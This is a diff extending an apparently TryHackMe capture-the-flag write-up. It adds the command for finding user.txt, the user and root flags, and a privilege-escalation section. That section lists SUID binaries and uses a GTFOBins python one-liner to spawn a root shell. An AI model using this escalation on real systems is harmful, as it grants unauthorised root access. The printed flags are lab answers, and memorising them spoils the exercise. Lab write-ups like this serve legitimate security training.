@@ -85,13 +85,38 @@ open it and go back the netcat
 
 the answer on this location
 
+```
+find / -name user.txt 2>/dev/null
+```
+
 ![image](https://user-images.githubusercontent.com/90561566/185158854-16fa3345-3891-4f22-af75-060564f2f28b.png)
 
 | Flag | user.txt |
 | --- | --- |
 | Answer | THM{y0u_g0t_a_sh3ll} |
 
+## Privilege Escalation
 
+The first step is to search for files with SUID permissions
 
+```
+find / -user root -perm /4000 2>/dev/null
+```
 
+![image](https://user-images.githubusercontent.com/90561566/185160041-9c37daa0-b802-4d84-8a10-0857ec5d2e48.png)
 
+we found a lot of files with SUID permissions
+
+i can see `/usr/bin/python` that mean we can execute python with root privileges
+
+using [gtfobins/python/suid](https://gtfobins.github.io/gtfobins/python/#suid), i found a command
+
+```
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+![image](https://user-images.githubusercontent.com/90561566/185163596-9782ef45-09e4-40de-93ef-11067ba3b2b8.png)
+
+| Flag | root.txt |
+| --- | --- |
+| Answer | THM{pr1v1l3g3_3sc4l4t10n} |
